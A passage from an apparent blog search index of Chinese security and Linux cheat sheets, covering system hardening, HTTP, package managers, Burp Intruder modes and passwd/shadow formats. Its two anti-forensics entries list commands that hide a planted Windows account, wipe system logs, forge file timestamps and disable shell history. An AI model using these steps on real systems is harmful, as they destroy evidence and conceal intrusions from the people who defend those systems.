    <content type="text"><![CDATA[编译编译(compile)，一般而言是将源代码转换成汇编代码，用以实现这种过程的工具称为编译器(compiler)。但要注意，编译器在同一时刻只能转换一个编译单元，所谓编译单元是指单个的源文件。目前在Linux中使用最广的编译器是GCC，即GNU Compiler Collection(GNU编译器套装)，GCC的原名为GNU C Compiler(GNU C语言编译器)，因为在后续逐渐支持了C++、Java等更多的语言，所以更改了其缩写的含义。 构建程序通常由多个编译单元组成，倘若逐个的去编译，这多少显得有点琐碎，因此我们需要一个自动化工具用来从源代码生成用户可以使用的目标，而这个工具就是构建系统(build system)，构建系统所作的就是构建(build)，构建的过程中肯定会调用到编译。从这个意义上来说，构建的范围比编译更广。在Linux中使用最广的构建系统是GNU make，它会读取Makefile文件中的配置信息来完成构建，有关Makefile文件更详细的信息可参考Makefile小记。 另外的Java世界中使用最广的构建系统是Maven，而在Android Studio中则使用到了后起之秀Gradle。 C语言从源代码到可执行文件的过程依次经过了预处理、编译、链接这几个步骤，即我们常说的GCC是编译器，但它实际可以完成的工作不止是编译，具体生成结果取决于我们的参数。 普通编译是生成当前系统平台下的目标文件，而交叉编译是指生成另一个系统平台下的目标文件。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux系统加固]]></title>
    <url>%2F2018%2F05%2F19%2Flinux-reinforcement%2F</url>
    <content type="text"><![CDATA[帐户与口令此方面的加固主要为了防止针对帐户的暴力破解。 禁用或删除无用帐户：使用命令userdel &lt;用户名&gt;删除不必要的帐户，使用参数-r即可删除相应用户的家目录和邮箱目录。使用命令passwd -l &lt;用户名&gt;锁定不必要的帐户，解锁可使用passwd -u &lt;用户名&gt;。 检查特殊帐户：使用命令awk -F: &#39;($2==&quot;&quot;)&#39; /etc/shadow查看空口令帐户，若存在，则使用命令passwd &lt;用户名&gt;为空口令帐户设定密码。使用命令awk -F: &#39;($3==0)&#39; /etc/passwd查看uid为0的帐户，确认uid为0的帐户只有root帐户。 添加口令策略：使用命令change -m 0 -M 30 -E 2020-01-01 -W 7 &lt;用户名&gt;修改帐户口令策略，-m表示密码最小使用天数，-M表示密码最大使用天数，-E表示密码到期时间，-W表示密码到期前多少天提醒。或者可以直接编辑/etc/login.defs文件进行修改。设置用户锁定：在CentOS7中，编辑/etc/pam.d/system-auth文件，添加auth required pam_tally2.so onerr=fail deny=6 unlock_time=300此行，表示当密码连续输错6次后锁定，锁定时间300秒。限制能su到root的用户：编辑/etc/pam.d/su文件，添加auth required pam_wheel.so group=test此行，表示只允许test组用户su到root。 服务安全服务越少，系统越安全。 关闭不必要的服务：在CentOS中，使用命令chkconfig --level &lt;init级别&gt; &lt;服务名&gt; on|off|reset设置服务在指定init级别下开机是否启动。 SSH服务安全：编辑/etc/ssh/sshd_config文件，修改默认端口，即Port项；禁止root用户远程登录，即PermitRootLogin项，应使用普通用户登录，特殊权限时使用sudo命令；禁止空密码登录，即PermitEmptyPasswords项；限制登录密码输错次数；最好使用密钥登录而不是密码登录，即PasswordAuthentication项值改为no。修改完后，需要使用service sshd restart重启SSH服务。 文件系统安全权限越小，系统越安全 设置umask值：编辑/etc/profile文件，修改umask值为027。 设置登录超时：编辑/etc/profile文件，添加TIMEOUT=180，即登录后无操作3分钟将超时断开连接。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows系统加固]]></title>
    <url>%2F2018%2F05%2F19%2Fwindows-reinforcement%2F</url>
    <content type="text"><![CDATA[基本配置下面这几项应为每一个使用Windows的用户的最最基本安全配置： 开启Windows防火墙 设置用户帐户控制(UAC)为合适级别 保持Windows更新 帐户安全此方面的加固主要是为了防止针对帐户的暴力破解，帐户是黑客入侵系统的突破口，帐户越多，危险系数越高。 停用Guest帐户：在计算机管理的本地用户和组中禁用Guest帐户，并为Guest帐户设置复杂密码，并拒绝远程访问。 重命名或禁用Administrator帐户：在计算机管理的本地用户和组中为Administrator帐户重命名，或直接禁用。 创建陷阱帐户：在计算机管理的本地用户和组中创建一个名为Administrator的本地帐户，并将它的权限设置成最低，加上一个超过10位的强密码。可通过将其隶属于Guest组已达到权限最低。 限制用户数量：在计算机管理的本地用户和组中删除所有的测试帐户、共享帐户和普通部门帐户，一般情况下，如果系统用户超过10个，一般总会存在一两个弱口令帐户。 开启帐户锁定策略：在本地安全策略的帐户锁定策略中设置帐户锁定阈值为3次，帐户锁定时间为30分钟，重置帐户锁定计数器为30分钟之后。 系统安全一个安全操作系统的基本原则是：最小的权限+最少的服务=最大的安全。 开启密码策略：在本地安全策略的密码策略中启用密码复杂性要求，设置密码长度最小值为7，密码最短使用期限为1，密码最长使用期限为42，强制密码历史为24，禁用以可还原的加密储存密码。 设置双重加密帐户保护：在运行对话框中输入syskey，启用SAM数据库加密工具，为Windows登录设置双重加密，注意此功能在Windows10中已被剔除。 取消默认共享：编辑注册表键HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters，新建项AutoShareServer，值为0，即可关闭盘符默认共享，新建项AutoShareWks，值为0，即可关闭ADMIN默认共享。 开启审核策略：在本地安全策略的审核策略中审核所有的成功失败操作，记录的信息可以在事件查看器的Windows日志中查看。 修改TTL值：编辑注册表键HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Tcpip\Parameters，新建项defaultTTL，随便赋值，以防黑客通过ping获取TTL以鉴别操作系统类型。 关闭不必要的服务：Windows默认会启动多个服务，可以在计算机管理的服务中禁用相关服务，下面列出了一些可以禁用的服务： COM+ Event System Computer Browser Distributed Link Tracking Client Routing and Remote Access]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[802.11协议分析]]></title>
    <url>%2F2018%2F05%2F11%2F80211%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPSec运行机制]]></title>
    <url>%2F2018%2F05%2F11%2Fipsec%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IP协议分析]]></title>
    <url>%2F2018%2F05%2F11%2Fip%2F</url>
    <content type="text"><![CDATA[IP(Internet Protocol，网际协议) 数据报格式]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCP协议分析]]></title>
    <url>%2F2018%2F05%2F11%2Ftcp%2F</url>
    <content type="text"><![CDATA[TCP(Transmission Control Protocol，传输控制协议) 报文段结构]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPS运行机制]]></title>
    <url>%2F2018%2F05%2F11%2Fhttps%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP协议分析]]></title>
    <url>%2F2018%2F05%2F11%2FHTTP%2F</url>
    <content type="text"><![CDATA[HTTP(Hypertext Transfer Protocol，超文本传输协议) 报文格式HTTP请求报文方法字段可以取几种不同的值，包括GET、POST、HEAD、PUT和DELETE。绝大部分的HTTP请求报文使用GET方法。 Host首部行指明对象所在的主机，该信息是Web代理高速缓存所要求的；Connection首部行指明采用非持续连接还是持续连接；User-Agent首部行指明用户代理；Accept-Language首部行指明用户想得到的语言版本。 使用GET方法时实体体(entity body)为空，而使用POST方法时才使用该实体体。 HEAD方法类似于GET方法。当服务器收到使用HEAD方法的请求时，将会用一个HTTP报文进行响应，但是并不返回请求对象。应用程序开发者常用HEAD方法进行调试跟踪。PUT方法常与Web发行工具联合使用，它运行用户上传对象到指定的Web服务器上指定的路径(目录)。PUT方法也被那些需要向Web服务器上传对象的应用程序使用。DELETE方法允许用户或者应用程序删除Web服务器上的对象。 HTTP响应报文Date首部行指示服务器产生并发送该响应报文的日期和时间；Last-Modified首部行指示了对象创建或者最后修改的日期和时间；Server首部行指示服务器类型，类似于User-Agent首部行；Content-Length首部行指示了被发送对象中的字节数；Content-Type首部行指示了实体体中的对象的MIME类型。 常见的状态码和其对应的短语：200 OK：请求成功，信息在返回的响应报文中。301 Moved Permanently：请求的对象已经被 永久 转移了，新的URL定义在响应报文的Location首部行中。客户软件将自动获取新的URL。302 Moved Temporarily：请求的对象已经被 暂时 转移了，新的URL定义在响应报文的Location首部行中。客户软件将自动获取新的URL。400 Bad Request：一个通用差错代码，指示该请求不能被服务器理解。403 Forbidden：客户端没有权限访问此资源。404 Not Found：被请求的文档不在服务器上。505 HTTP Version Not Supported：服务器不支持请求报文使用的HTTP协议版本。 一般而言，200系列代表正常，300系列代表重定向，400系列代表客户端错误，500系列代表服务端错误。 Web缓存条件GET(conditional GET)方法：请求报文使用GET方法，并且请求报文中包含一个If-Modified-Since首部行。 Web缓存器为了验证所缓存的对象是否是最新的，会使用条件GET方法向目标服务器发送一个请求报文，If-Modified-Since首部行的值为当初缓存对象时响应报文中Last-Modified首部行的值。如果所要验证的对象是最新的，即没有被修改过，则目标服务器会返回一个“304 Not Modified”响应报文，其中实体体为空。 注意 HTTP是一个无状态协议(stateless protocol)。 HTTP可以采用非持续连接或持续连接，默认采用持续连接。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[set、env与export]]></title>
    <url>%2F2018%2F05%2F09%2Fset-env-export%2F</url>
    <content type="text"><![CDATA[环境变量环境变量，顾名思义由环境和变量两部分组成，本质上就是一些变量，每个进程都有一个自己的运行环境，而在这些环境中又有一些定义的变量，Shell也是如此，同样的，通过Shell所运行的命令，相当于从父进程创建了一个子进程，它们共享同样的环境变量。 在Linux中，环境变量可以大致分为Shell环境变量和用户环境变量两大类，不同的Shell有不同的Shell环境变量，例如bash与Zsh的Shell环境变量就不相同，而用户环境变量通常是由用户自定义的，Shell环境变量包含了用户环境变量。 在Linux中可以使用declare命令直接定义Shell环境变量，如：123# 定义Shell环境变量A，值为hello，注意等号两边不能有空格# 按照传统，环境变量一般为全大写declare A=hello 同样的，在Linux中使用echo命令即可打印环境变量的值，如：123# 打印A的值，环境变量前需加“$”符号，# 表示要打印的是环境变量而不是一般字符串echo $A 值得注意的是，这种定义只对当前终端有效，关闭终端后失效。 常见的Shell环境变量有： COLUMNS：当前终端的宽度 LINES：当前终端的高度 常见的用户环境变量有： PATH：用以指定命令的搜索目录 HOME：用以指定用户的家目录 SHELL：用以指定用户的登录Shell HTTP_PROXY：用以指定终端的HTTP代理信息，与下一个变量要同时设置 HTTPS_PROXY：用以指定终端的HTTPS代理信息 setset命令用来显示或设置Shell环境变量，当不带参数运行时默认显示所有已定义的Shell环境变量，若要设置环境变量可采用：1set A=hello 值得注意的是，当declare命令不带任何参数运行时，也会显示所有的Shell环境变量，但它比set显示的结果要更加清晰。 关于set命令更多的参数使用说明可参考阮一峰的博文：Bash脚本set命令教程 env（仅限于Linux）env命令用来显示或设置用户环境变量，当不带参数运行时默认显示所有已定义的用户环境变量，若要设置环境变量可采用：12 export（仅限于Linux）export命令用来显示或设置当前导出至用户环境变量的Shell环境变量，当不带参数运行时默认显示所有已导出至用户环境变量的Shell环境变量，若要导出某Shell环境变量到用户环境变量可采用：1export a=hello 这一步操作实际上完成了两步操作，即：12declare a=hello #定义一个Shell环境变量$aexport $a #导出至用户环境变量]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[source、sh与 ./]]></title>
    <url>%2F2018%2F05%2F09%2Fsource-sh%2F</url>
    <content type="text"><![CDATA[sourcesource a.sh在当前Shell中执行a.sh，a.sh不需要有执行权限。source也可以简写为.，比如. a.sh。 shsh a.sh打开一个子Shell去执行a.sh，a.sh不需要有执行权限。在子Shell里执行的a.sh里设置的变量，不会影响到父Shell。类似的，bash与sh同理。 ././a.sh打开一个子Shell去执行a.sh，a.sh需要有执行权限。注意，这里./与a.sh之间没有空格，换个角度看，其实没有使用任何命令，只是指定了当前文件夹下的这个文件而已。这就相当于双击这个文件去运行一样，那这个文件肯定要具有可执行权限。至于为什么要加./，我猜想是为了预防与环境变量中相同的名称引起冲突。前面采用了相对路径的方法，当然也可以采用绝对路径，比如/root/a.sh这样，同样可以执行。另外，./运行的文件里通常有Shebang一行，也就是以#!开头的第一行，用以指明执行这个脚本文件的解释程序。如果没有Shebang一行，那么以./a.sh运行脚本时，会自动使用环境变量中的$SHELL变量所指定的解释器来运行。最后，在以sh a.sh或bash a.sh这样的命令运行脚本时，即使文件中指明了Shebang，也会自动忽略，因为在命令中已经明确指定了所采用的解释器。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux的包管理机制]]></title>
    <url>%2F2018%2F05%2F09%2Flinux-package%2F</url>
    <content type="text"><![CDATA[不同Linux发行版的主要区别是其包管理机制不同，Linux发行版大致可以分为2个派别：一派以Red Hat为首，主要包括CentOS(社区版)、Fedora(桌面版)等；另一派以Debian为首，主要包括Ubuntu、Kali等。Red Hat系采用rpm为其包格式，yum为其包管理工具；Debian系采用dpkg为其包格式，apt-get为其包管理工具。 rpm与yumrpm全称Red-Hat Package Manager(RPM软件包管理器)，是Red Hat系中的包格式，同时也是其本地包管理工具，常用命令有：12rpm -i a.rpm #安装arpm -e a #卸载a yum全称Yellow dog Updater, Modified(修改后的黄色狗更新器)，是Red Hat系中的包管理工具，常用命令有：1234yum update #更新包列表yum upgrade #更新包yum install a #安装ayum remove a #卸载a dpkg与apt-getdpkg全称Debian Packager(Debian包工具)，是Debian系中的包格式，同时也是其本地包管理工具，常用命令有：12dpkg -i a.dpkg #安装adpkg -r a #卸载a apt-get是apt中的一个子程序，apt全称Advanced Packaging Tool(先进的包工具)，是Debian系中的包管理工具，apt的程序包来源列表文件位于/etc/apt/sources.list，apt-get的常用命令有：1234sudo apt-get update #更新包列表sudo apt-get upgrade #更新包sudo apt-get install a #安装asudo apt-get purge a #卸载a并删除其配置文件（即彻底删除），命令作用等同于apt-get --purge remove a 同样的，apt-cache也是apt中的一个子程序，它的常用命令有：1sudo apt-cache depends a #查看包a的依赖包 值得注意的是，随着新版系统的到来，出现了更为强大的apt命令，可以简单认为apt集合了apt-get、apt-cache、apt-config中的最常用命令选项。例如，apt install相比apt-get install增加了色彩显示以及进度条显示等功能。因此，更建议使用apt命令，常用命令有：12345sudo apt update #更新包列表sudo apt upgrade #更新包sudo apt install a #安装asudo apt purge a #卸载a并删除其配置文件（即彻底删除），命令作用等同于apt --purge remove asudo apt list --installed #查看已安装的包 关于Ubuntu中程序包的搜索可以使用Ubuntu Packages Search。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手机号与身份证号的秘密]]></title>
    <url>%2F2018%2F05%2F09%2Fphone-number-and-id-card%2F</url>
    <content type="text"><![CDATA[手机号码国内手机号码为11位数，按照各部分编码的含义可以分为3段：前3位是网络识别号，用以标识一个通信运营商；第4-7位是地区编码，由HLR归属位置寄存器确定；第8-11位是用户号码，此段随机分配。 身份证号码国内居民身份证号码为18位数，按照各部分编码的含义可以分为4段：前6位是地址码，即编码对象常住户口所在县的行政区划代码，其中第1-2位表示省，第3-4位表示市，第5-6位表示县；第7-14位是出生日期码；第15-17位是顺序码，即在地址码所标识的区域范围内，对同年、月、日出生的人员编定的顺序号，其中第17位奇数分给男性，偶数分给女性；第18位是校验码，根据前面17位数字码，按照如下算法计算出来的：]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MIME Type]]></title>
    <url>%2F2018%2F05%2F09%2FMIME-Type%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[后渗透测试阶段的信息收集]]></title>
    <url>%2F2018%2F05%2F09%2Finformation-gathering-of-post-exploitation%2F</url>
    <content type="text"><![CDATA[浏览器密码、历史，电脑密码，邮箱密码，QQ聊天记录，最近打开的文件，环境变量，持久后门我们假设客户端为Windows系统，服务器为Linux系统，下面分别针对客户端与服务器进行信息收集。 Windows登录密码Windows的登录密码保存在%windir%\System32\config\SAM中， Linux]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[针对哈希算法的攻击]]></title>
    <url>%2F2018%2F05%2F09%2Fhash-attack%2F</url>
    <content type="text"></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编码与加密]]></title>
    <url>%2F2018%2F05%2F08%2Fencode-encrypt%2F</url>
    <content type="text"><![CDATA[编码编码(encode)是信息从一种形式或格式转换为另一种形式的过程。相应的，解码(decode)是编码的逆过程。常见的编码算法有ASCII编码、URL编码、HTML编码、Base64编码等。 加密加密(encryption)是将明文信息改变为难以读取的密文内容，使之不可读。只有拥有解密方法的对象，经由解密(decryption)过程，才能将密文还原为正常可读的内容。现代密码学中的加密算法可以分为两类：对称加密(Symmetric encryption)和非对称加密(Asymmetric encryption)。对称加密就是将信息使用一个密钥进行加密，解密时使用同样的密钥，同样的算法进行解密。非对称加密，又称公开密钥加密，是加密和解密使用不同密钥的算法，一个是公开密钥，一个是私有密钥，一个用作加密的时候，另一个则用作解密，虽然两个密钥在数学上相关，但如果知道了其中一个，并不能凭此计算出另外一个。在通信中，加密通常使用的是对方的公钥，当对方收到密文后可以使用自己的私钥解密。如果加密使用的是自己的私钥，则密文可由任何人解密，由此可验证该文件必定出自该用户，这亦称作数字签名(Digital Signature)。常见的对称加密算法有DES、3DES、AES、RC5等。常见的非对称加密算法有RSA、DSA、ECDSA、Elgamal等。非对称加密在计算上相当复杂，速度远远比不上对称加密，因此，在一般实际情况下，往往通过非对称加密来随机创建临时的对称密钥，亦即对话键，然后才通过对称加密来传输大量、主体的数据。加密算法实质上是密码算法中的一种，另一种则是哈希(hash)算法。 哈希哈希算法，又称为散列算法，就是把任意长度的输入变换成固定长度的输出，是一种不可逆的算法，也就是说不能通过密文(即哈希值)反算出明文，这是一种单向加密的算法。另外，多个不同的明文可能会得到同一个密文，因为值域是有限的，这种情况称为冲突。一个优秀的哈希算法会尽量的减少这种冲突性。常见的哈希算法有MD5、SHA-1、SHA-256、CRC-32、CRC-64等。注意： 密码学建议，不要使用任何自己创造的私有加密算法，应该使用广泛使用的公开加密算法，这些都是已被证明安全的。 编码与加密主要的区别在于，所用的Key是否是公共所知的，或者说，编码根本就没有Key。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反取证之Windows]]></title>
    <url>%2F2018%2F05%2F02%2Fanti-forensics-windows%2F</url>
    <content type="text"><![CDATA[MACE时间和反取证之Linux中的一样，Windows也有MAC时间，不过在Windows中，C指的是Created，即创建时间，Windows中默认显示的是修改时间，另外，在Windows的NTFS文件系统中还有E时间，即MFT entry，其中包含了文件的大量信息，包括大小、名称、目录位置、磁盘位置、创建日期等，在擦除痕迹时也要擦除E时间，同样，meterpreter中的timestomp命令可以方便的修改MACE时间。 隐藏新建账号当在目标系统上新建了用户账号后，通常会在登录界面上显示出来，要实现隐藏，可以修改注册表项，采用如下命令：1REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v uname /t REG_DWORD /d 0 注意：这种隐藏只是在登录界面的隐藏，用户使用net user或“本地用户和组”仍然可以查到新建的账户。 日志文件清除相关日志文件 系统日志Windows系统日志文件一般存放在Windows文件夹下，可以使用如下命令删除之：1del %windir%\*.log /a/s/q/f 另外，meterpreter中的clearev命令可以删除事件查看器中的日志信息。 Web日志IIS的日志文件位于%windir%\System32\LogFiles目录下。 最后，请不要忘记HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>Windows</tag>
        <tag>计算机取证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反取证之Linux]]></title>
    <url>%2F2018%2F05%2F02%2Fanti-forensics-linux%2F</url>
    <content type="text"><![CDATA[后渗透测试阶段的重要工作便是擦除痕迹，也即反取证，文件系统访问都会留下痕迹，最好的避免计算机取证的方法就是不要碰文件系统，这也是meterpreter的先天优势，它完全基于内存，Linux中的反取证主要涉及MAC时间、日志文件、history： MAC时间MAC即Modified/Accessed/Changed，也就是修改/访问/更改时间，修改时间指对文件内容修改时的时间，访问时间指对文件内容访问时的时间(例如通过cat查看时)，更改时间指对文件属性、权限更改时的时间。使用ls -l默认查看的是修改时间，要查看其余2个时间，可以加参数ls -l --time=atime/ctime，另一个查看MAC时间的命令是stat。使用touch -d &quot;5 days ago&quot;或touch -t 1805021030可以修改MAC中的MA时间。meterpreter中的timestomp命令可以方便的修改MAC时间。 日志文件清除相关日志文件 系统日志Linux中的日志文件主要有/var/log/auth.log、/var/log/secure、/var/log/wtmp、/var/log/btmp、/var/log/lastlog、/var/log/faillog。Debian系的auth.log文件与RedHat系的secure文件都记录了系统的登录日志，last命令用于查看登录日志以及重启日志，文件位于/var/log/wtmp；lastb命令用于查看登录失败日志，文件位于/var/log/btmp；lastlog命令用于查看所有用户最近一次登录日志，文件位于/var/log/lastlog；faillog命令与lastlog命令一样，用于查看用户登录失败日志，文件位于/var/log/faillog，此命令仅限于Debian系。 Web日志Apache的日志文件位于/var/log/apache2；Nginx的日志文件位于/var/log/nginx。 historyLinux中，每次输入的命令都会记录在用户文件夹中的.bash_history文件中，默认记录1000条命令，使用history命令即可查看，清除记录的方法是使用history -c命令。另一种清除记录的方法是更改.bash_history文件的属性，使用命令：chattr +i .bash_history使其不可被更改，从而无法向其写入任何数据。 最后，请不要忘记HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>计算机取证</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[形而上与形而下]]></title>
    <url>%2F2018%2F05%2F01%2Fmetaphysics-physics%2F</url>
    <content type="text"><![CDATA[形而上者谓之道，形而下者谓之器。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Sniper、Battering ram、Pitchfork、Cluster bomb的区别]]></title>
    <url>%2F2018%2F05%2F01%2Fburpsuite-intruder-attack-type%2F</url>
    <content type="text"><![CDATA[Burp Suite中的Intruder模块里有4种攻击模式，分别为Sniper、Battering ram、Pitchfork、Cluster bomb，在这里假设Payload set1=[1, 2]，Payload set2=[a, b, c, d]： SniperSniper，中文“狙击手”，每次只针对1个Payload Position，使用1个Payload set，示例如下： Request Position1(default:x) Position2(default:y) #1 1 y #2 2 y #3 x 1 #4 x 2 Battering ramBattering ram，中文“攻城槌”，每次针对多个Payload Position，使用1个Payload set，示例如下： Request Position1 Position2 #1 1 1 #2 2 2 PitchforkPitchfork，中文“杈子”，每次针对多个Payload Position，使用多个Payload set，最多支持5个列表，也即5个位置，采用平行模式，请求次数以最小列表项为准，示例如下： Request Position1 Position2 #1 1 a #2 2 b Cluster bombCluster bomb，中文“集束炸弹”，每次针对多个Payload Position，使用多个Payload set，最多支持5个列表，也即5个位置，采用交叉模式，请求次数为各列表项之积，示例如下： Request Position1 Position2 #1 1 a #2 1 b #3 1 c #4 1 d #5 2 a #6 2 b #7 2 c #8 2 d]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[URI与URL的区别]]></title>
    <url>%2F2018%2F04%2F29%2Furl-uri%2F</url>
    <content type="text"><![CDATA[URI，全称”Uniform Resource Identifier”，中文“统一资源标志符”，是一个用于标识某一互联网资源名称的字符串。URI的最常见的形式是统一资源定位符（URL），经常指定为非正式的网址。更罕见的用法是统一资源名称（URN），其目的是通过提供一种途径，用于在特定的名字空间资源的标识，以补充网址。 URL，全称”Uniform Resource Locator”，中文“统一资源定位符”，URL是URI的子集。示例如下：https://howiezhao.github.io/2018/04/29/url-uri/上面这个URL唯一标识了互联网中一台服务器上的一篇文章(即本篇文章)。URL的格式一般为scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment] URN，全称”Uniform Resource Name”，中文“统一资源名称”，是另一种形式的URI，它通过特定命名空间中的唯一名称来标识资源。示例如下：urn:isbn:9780141036144上面这个URN唯一标识了乔治·奥威尔所著的《1984》。 简单说，URL代表一个人的位置，URN代表一个人的身份证号，通过URL和URN都可以唯一的找到这个人，所以它们都属于URI。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透中PoC、Exp、Payload与Shellcode的区别]]></title>
    <url>%2F2018%2F04%2F29%2Fpayload-shellcode-exp-poc%2F</url>
    <content type="text"><![CDATA[PoC，全称”Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。Exp，全称”Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。Payload，中文“有效载荷”，指成功exploit之后，真正在目标系统执行的代码或指令。Shellcode，简单翻译“shell代码”，是Payload的一种，由于其建立正向/反向shell而得名。 几点注意：PoC是用来证明漏洞存在的，Exp是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了PoC，才有Exp。Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的Exp，也就是说不存在通用的Exp。Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。Shellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。 另外：在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。 尾巴：想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个Exp，你在他家所做的就是不同的Payload，就把窃听器当作Shellcode吧！]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux中/etc/passwd与/etc/shadow的区别]]></title>
    <url>%2F2018%2F04%2F29%2Fpasswd-and-shadow%2F</url>
    <content type="text"><![CDATA[简单来说，/etc/passwd存储一般的用户信息，任何人都可以访问；/etc/shadow存储用户的密码信息，只有 root 用户可以访问。下面来详细介绍： /etc/passwd早期的Linux中，用户的密码也存储在此文件中，但因为此文件所有人都可以访问，对密码的存储不安全，但又不能把它的权限改为仅 root 用户，因为系统的其他程序可能会用到此文件中存储的用户其他信息，所以，后来Linux将用户密码存储到了/etc/shadow文件中，并将其权限设为仅 root 用户。在渗透过程中，这两个文件最好都检查。/etc/passwd的文件格式为：用户名:密码:用户ID:用户组ID:注释:用户目录:登录shell，共7项，默认情况下，root的用户ID为0，1-99表示预定义用户，100-999表示其他系统帐户，新建的其他用户ID从1000起，用户组ID代表的详细信息存储在/etc/group文件中，如果密码被存储在了/etc/shadow文件中，则此文件中密码项为x，常见形式如下：1root:x:0:0:root:/root:/bin/bash /etc/shadow/etc/shadow的文件格式为：用户名:密码:上次修改密码日期(从1970年1月1日起的天数):密码在两次修改期间的最小天数(0表示可在任何时间修改):密码需要被变更的天数(99999表示不需要变更):密码变更前提前几天警告:账号失效日期:账号失效后被禁用的天数:保留字段，共9项，如果密码项以 ! 或 * 起始，则代表此账号被锁定，不能用于登录，密码项中更为详细的格式为：\$加密方法ID\$Salt\$加密值，常见形式如下：1root:$6$Fsf6Q6SH$MlagWih0lcGFxtAo7/s8Z5.wywJyCqH6qateZ6yPFOPm8bNYTGAEPygZxSOPR1A9Rtw.WxJp2fNMOoeB1wj890:17524:0:99999:7:::]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Rolling 2017中无法登录BeEF的解决方案]]></title>
    <url>%2F2018%2F02%2F08%2Fkali-beef-bug%2F</url>
    <content type="text"><![CDATA[在Kali Rolling 2017中打开BeEF然后自动跳转到登录页面，会发现只有BeEF的图标而没有登录框，无法进行登录，经查是因为和Metasploit的集成有关的，解决方案如下：将/usr/share/beef-xss/extensions/admin_ui/api/handler.rb文件中第22行的1minified = Uglifier.compile(evaluated) 改为1minified = evaluated 保存并重启BeEF即可。]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
